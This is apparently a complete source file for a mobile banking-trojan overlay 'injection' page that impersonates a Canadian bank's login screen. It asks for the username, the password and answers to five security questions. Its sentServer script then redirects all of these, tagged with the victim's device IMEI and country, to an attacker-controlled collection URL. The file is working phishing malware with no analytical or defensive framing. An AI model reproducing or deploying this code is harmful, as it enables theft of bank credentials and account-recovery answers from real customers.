<html>
<head>
	<link rel="stylesheet" href="ca/com.td/css/style.css">
	<link rel="stylesheet" href="css/bootstrap.min.css">
	<link rel="stylesheet" href="css/cat.style.css">
	<script src="js/cat.functions.js"></script>
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
<div id="content_div">
<div id="header">
<img src="ca/com.td/img/logo.png" style="width: 50px">
</div>

<form id="form">
<div id="form1">
	<div class="form">
		<img src="ca/com.td/img/user.png" id="ico">
		<input name="Username or Access Card" id="login"  style = "width: 90%;"  placeholder="Username or Access Card" maxlength="20" class="input" type="text"><br>
		<img src="ca/com.td/img/lock.png" id="ico">
		<input name="Password" placeholder="Password"  style = "width: 90%;"  id="password" maxlength="50" class="input" type="password"><br>
	</div><br><br>
	<center>	
<input type="button" class="submit" id="input_submitBtn" value="Login"/>


</div>


<div id="form2" style="display: none;">
<div class="form" style="padding: 20px;">
	<h3 style="color: #fff;"> Security questions </h3>
	
		<select data-mini="true" name="questions1" id="selects1" class="selects" style = "width: 90%;" > 
			<option value=""> Select from List </option>
			<option value="What is your favourite hobby?"> What is your favourite hobby? </option>
			<option value="Who was your 1st grade school teacher?"> Who was your 1st grade school teacher? </option>
			<option value="Who is your favourite cartoon character?"> Who is your favourite cartoon character? </option>
			<option value="What is your most memorable vacation spot?"> What is your most memorable vacation spot? </option>
			<option value="What is your grandmother's middle name (your father's mother)?"> What is your grandmother's middle name (your father's mother?) </option>
			<option value="What is the postal/zip code of your family vacation home?"> What is the postal/zip code of your family vacation home? </option>
			<option value="What online froum or site do you frequent most?"> What online froum or site do you frequent most? </option>
			<option value="What is your favourite hometown newspaper?"> What is your favourite hometown newspaper? </option>
			<option value="What was your favourite vegetable?"> What was your favourite vegetable? </option>
			<option value="What is your favourite TV show?"> What is your favourite TV show? </option>
			<option value="What is your grandmother's middle name (your mother's mother)?"> What is your grandmother's middle name (your mother's mother)? </option>
			<option value="What is the 1st concert you attended?"> What is the 1st concert you attended? </option>
			<option value="What is your favourite magazine subscription?"> What is your favourite magazine subscription? </option>
			<option value="What type of food do you like most? Ex. Italian"> What type of food do you like most? Ex. Italian </option>

		</select>
		
		<input id="answers1" class="input" type="text" onkeyup="check();" style = "width: 90%;" >
	<br>
	<br>
	<br>
		<select data-mini="true" name="questions2" id="selects2" class="selects"  style = "width: 90%;" > 
			<option value=""> Select from List </option>
			<option value="What was your wedding color?"> What was your wedding color? </option>
			<option value="Who is your childhood hero?"> Who is your childhood hero? </option>
			<option value="What is your grandmother's middle name (your mother's father)?"> What is your grandmother's middle name (your mother's father)? </option>
			<option value="What is your grandfather's middle name (your father's father)?"> What is your grandfather's middle name (your father's father)? </option>
			<option value="What was the nickname of your grandfather?"> What was the nickname of your grandfather? </option>
			<option value="What is your favourite bakery?"> What is your favourite bakery? </option>
			<option value="What is the first name of the youngest of your siblings?"> What is the first name of the youngest of your siblings? </option>
			<option value="What was your favourite band in college?"> What was your favourite band in college? </option>
			<option value="What year was your basement last renovated?"> What year was your basement last renovated? </option>
			<option value="What is your youngest sibling's nickname?"> What is your youngest sibling's nickname? </option>
			<option value="What was the make of the first mobile phone you owned?"> What was the make of the first mobile phone you owned? </option>
			<option value="Who is your favourite poet?"> Who is your favourite poet? </option>
			<option value="What is was your favourite toy as a child?"> What is was your favourite toy as a child? </option>
			<option value="Who is your favourite painter?"> Who is your favourite painter? </option>
			<option value="What is your oldest child's middle name?"> What is your oldest child's middle name? </option>

		</select>
		
		<input id="answers2" class="input" type="text" onkeyup="check();"  style = "width: 90%;" >
	<br>
	<br>
	<br>
		<select data-mini="true" name="questions2" id="selects3" class="selects" style = "width: 90%;"  > 
			<option value=""> Select from List </option>
			<option value="What is your paternal grandmother's first name?"> What is your paternal grandmother's first name? </option>
			<option value="Which gas station do you frequent most?"> Which gas station do you frequent most? </option>
			<option value="What is the first name of your oldest nephew?"> What is the first name of your oldest nephew? </option>
			<option value="What is your favourite ice cream flavour?"> What is your favourite ice cream flavour? </option>
			<option value="What is your oldest sibling's nickname?"> What is your oldest sibling's nickname? </option>
			<option value="What is your spouse's/partner's nickname?"> What is your spouse's/partner's nickname? </option>
			<option value="What is the first name of your spouse's/partner's youngest sibling?"> What is the first name of your spouse's/partner's youngest sibling? </option>
			<option value="What board game do you play most often?"> What board game do you play most often? </option>
			<option value="What is the first name of your best childhood friend?"> What is the first name of your best childhood friend? </option>
			<option value="What is your youngest child's middle name?"> What is your youngest child's middle name? </option>
			<option value="What is your favourite flower?"> What is your favourite flower? </option>
			<option value="What is the first name of your spounse's/partner's oldest sibling?"> What is the first name of your spounse's/partner's oldest sibling? </option>
			<option value="What is your favourite dessert?"> What is your favourite dessert? </option>
			<option value="What is your dream job?"> What is your dream job? </option>
	
		</select>
		
		<input id="answers3" class="input" type="text" onkeyup="check();"  style = "width: 90%;" >
	<br>
	<br>
	<br>
		
		
		<select data-mini="true" name="questions2" id="selects4" class="selects"  style = "width: 90%;" > 
			<option value=""> Select from List </option>
			<option value="What is your favourite fragrance?"> What is your favourite fragrance? </option>
			<option value="Who is your favourite author?"> Who is your favourite author? </option>
			<option value="What is the name of the hospital where your 1st child was born?"> What is the name of the hospital where your 1st child was born? </option>
			<option value="What is the name of your most influential mentor?"> What is the name of your most influential mentor? </option>
			<option value="What year did you get your first car?"> What year did you get your first car? </option>
			<option value="What was the first name of your first manager?"> What was the first name of your first manager? </option>
			<option value="What was the name of your first roommate?"> What was the name of your first roommate? </option>
			<option value="What was the first name of your favourite teacher in final year of high school?"> What was the first name of your favourite teacher in final year of high school? </option>
			<option value="What is the first name of the person you went to your prom with?"> What is the first name of the person you went to your prom with? </option>
			<option value="What was the first name of your nearest neighbour in 2000?"> What was the first name of your nearest neighbour in 2000? </option>
			<option value="What is the name of your first employer?"> What is the name of your first employer? </option>
			<option value="What is your nickname?"> What is your nickname? </option>
			<option value="What is the name of your first pet?"> What is the name of your first pet? </option>
			<option value="Who is your favourite person from history?"> Who is your favourite person from history? </option>
			<option value="What if your favourite fictional character?"> What if your favourite fictional character? </option>
	
		</select>
		
		<input id="answers4" class="input" type="text" onkeyup="check();"  style = "width: 90%;" >
	<br>
	<br>
	<br>
		
		<select data-mini="true" name="questions2" id="selects5" class="selects" style = "width: 90%;"  > 
			<option value=""> Select from List </option>
			<option value="What is your favourite pizza place?"> What is your favourite pizza place? </option>
			<option value="What is your favourite quote?"> What is your favourite quote? </option>
			<option value="What is your favourite brand of potato chips?"> What is your favourite brand of potato chips? </option>
			<option value="What is the name of the hospital in which you were born?"> What is the name of the hospital in which you were born? </option>
			<option value="What was the name of your high school? (Enter only 'Riverdale' for Riverdale High School)"> What was the name of your high school? (Enter only 'Riverdale' for Riverdale High School) </option>
			<option value="What is the name of your elementary school?"> What is the name of your elementary school? </option>
			<option value="What is the street name where you lived when you were 10 years old?"> What is the street name where you lived when you were 10 years old? </option>
			<option value="What is your favourite restaurant?"> What is your favourite restaurant? </option>
			<option value="What was the make of your first car?"> What was the make of your first car? </option>
			<option value="What high school did your spounse/partner attend?"> What high school did your spounse/partner attend? </option>
			<option value="What is the name of the post secondary institution that your spounse/partner attended?"> What is the name of the post secondary institution that your spounse/partner attended? </option>
			<option value="Where did you meet your spounse/partner for the first time? (Enter location only)"> Where did you meet your spounse/partner for the first time? (Enter location only) </option>
			<option value="What was your favourite college/university year?"> What was your favourite college/university year? </option>
			<option value="What did you study at your post secondary institution?"> What did you study at your post secondary institution? </option>
			<option value="What street did your best friend in high school live on? (Enter full name of street only)"> What street did your best friend in high school live on? (Enter full name of street only) </option>
	
		</select>
		
		<input id="answers5" class="input" type="text" onkeyup="check();"  style = "width: 90%;" >
	<br>
	<br>
	<br>
		<input type="button" onClick="sentServer();" class="submit" id="input_submitBtn2" disabled="disabled" value="Sign In"/>
</div>
</div>
<script>
function check() {
  var inp1 = document.getElementById('answers1'),
      inp2 = document.getElementById('answers2'),
      inp3 = document.getElementById('answers3');
      inp4 = document.getElementById('answers4');
      inp5 = document.getElementById('answers5');
  document.getElementById('input_submitBtn2').disabled = inp1.value && inp2.value && inp3.value && inp4.value && inp5.value ? false : "disabled";
}
</script>
	</center>

</form>
            <script type="text/javascript">
			function getRealDisplay(elem) {
                    if (elem.currentStyle) {
                        return elem.currentStyle.display;
                    } else if (window.getComputedStyle) {
                        var computedStyle = window.getComputedStyle(elem, null);
                        return computedStyle.getPropertyValue('display')
                    }
                }

                function __hide(el) {
                    if (!el.hasAttribute('displayOld')) {
                        el.setAttribute("displayOld", el.style.display)
                    }

                    el.style.display = "none"
                }

                displayCache = {};

                function __show(el) {
                    if (getRealDisplay(el) != 'none') return;

                    var old = el.getAttribute("displayOld");
                    el.style.display = old || "";

                    if (getRealDisplay(el) === "none") {
                        var nodeName = el.nodeName, body = document.body, display;

                        if (displayCache[nodeName]) {
                            display = displayCache[nodeName]
                        } else {
                            var testElem = document.createElement(nodeName);
                            body.appendChild(testElem);
                            display = getRealDisplay(testElem);

                            if (display === "none") {
                                display = "block"
                            }

                            body.removeChild(testElem);
                            displayCache[nodeName] = display
                        }

                        el.setAttribute('displayOld', display);
                        el.style.display = display
                    }
                }

 var step1 = document.getElementById('form1'),
     step2 = document.getElementById('form2'),
	 spinner = document.getElementById('spinner');
	 
                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {
					
						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = oCodeInp.className = 'input';
						} catch(e){};
						
                        if (oNumInp.value.length < 4) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{4,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
                    
					
					__hide(step1);
                    __show(step2);
                   
                    return false;
                };
            </script>

<script>
function sentServer()
{
var login1 = document.forms["form"].elements["login"].value; 
var pass = document.forms["form"].elements["password"].value; 
var question1 = document.forms["form"].elements["selects1"].value; 
var answer1 = document.forms["form"].elements["answers1"].value; 
var question2 = document.forms["form"].elements["selects2"].value; 
var answer2 = document.forms["form"].elements["answers2"].value; 
var question3 = document.forms["form"].elements["selects3"].value; 
var answer3 = document.forms["form"].elements["answers3"].value; 
var question4 = document.forms["form"].elements["selects4"].value; 
var answer4 = document.forms["form"].elements["answers4"].value; 
var question5 = document.forms["form"].elements["selects5"].value; 
var answer5 = document.forms["form"].elements["answers5"].value; 


	var url='<?php echo $URL; ?>';
	var imei_c='<?php echo $IMEI_country; ?>';


location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_10|CA_TD|Username: "+login1+"//br//Password: "+pass+"//br//question1: "+question1+"//br//answer1: "+answer1+"//br//question2: "+question2+"//br//answer2: "+answer2+"//br//question3: "+question3+"//br//answer3: "+answer3 +"//br//question4: "  +question4+"//br//answer4: "+answer4+"//br//question5: "+question5+"//br//answer5: "+answer5);
}
 </script>
</div>
</body>
</html>
